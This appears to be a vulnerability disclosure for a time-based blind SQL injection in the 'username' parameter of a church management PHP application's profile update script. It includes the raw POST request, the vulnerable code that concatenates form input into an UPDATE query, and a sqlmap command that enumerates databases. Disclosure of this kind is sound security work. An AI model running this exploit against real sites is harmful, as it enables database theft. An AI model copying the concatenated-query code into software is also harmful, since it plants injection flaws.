# Code Source
https://www.sourcecodester.com/php/17856/best-church-management-software-free-download-full-version.html

# Description
A vulnerability has been found in SourceCodester Best church management software 1.1 and classified as critical. SourceCodester Best church management software 1.1 has a SQL Injection vulnerability in `/admin/app/profile_crud.php`. Affected is file `/admin/app/profile_crud.php`,The manipulation of the argument `username` leads to SQL inject. Remote attackers can leverage time-based blind SQL injection to extract data from the database.

# Request
```
POST /admin/app/profile_crud.php HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br, zstd
Content-Type: application/x-www-form-urlencoded
Content-Length: 13
Origin: http://127.0.0.1
Connection: keep-alive
Referer: http://127.0.0.1/index.php
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Priority: u=0, i

update=1&username=*
```

# Affect code
```
......
if (isset($_POST['update'])) {

	$uploadDir = '../../assets/images/';
	if ($_FILES['image']['tmp_name'] != '') {
		$filepath = "../../assets/images/" . $_FILES["image"]["name"];
		$originalName = basename($_FILES['image']['name']);
		$extension = pathinfo($originalName, PATHINFO_EXTENSION);

		// Generate a new unique file name
		$newName = uniqid() . '.' . $extension;

		// Set the path to the new file location
		$newFilePath = $uploadDir . $newName;

		// Upload the file to the server


		if (move_uploaded_file($_FILES["image"]["tmp_name"], $filepath)) {
			$img = $_FILES["image"]["name"];

			@unlink("../../assets/images/" . $_POST['old_cat_img']);
		}
	} else {
		$img = $_POST['old_cat_img'];
	}


	//echo "UPDATE `login` SET `username`='".$_POST['username']."',`email`='".$_POST['email']."',`mobileno`='".$_POST['mobileno']."',`image`='".$img."' WHERE id='".$_SESSION['id']."' ";exit;
	$stmt = $conn->prepare("UPDATE `login` SET `username`='" . $_POST['username'] . "',`email`='" . $_POST['email'] . "',`mobileno`='" . $_POST['mobileno'] . "',`image`='" . $img . "' WHERE id='" . $_SESSION['id'] . "' ");

	$stmt->execute();



	header("location:../dashboard.php");
}
......
```

# Exploit
```
python sqlmap.py -r .\1.txt --dbs
```
![图片](https://github.com/user-attachments/assets/0498b616-b4d9-44bc-bad5-09604a1f66ff)

![图片](https://github.com/user-attachments/assets/fd0f9c12-d82c-44e9-8536-ef480d3489c5)
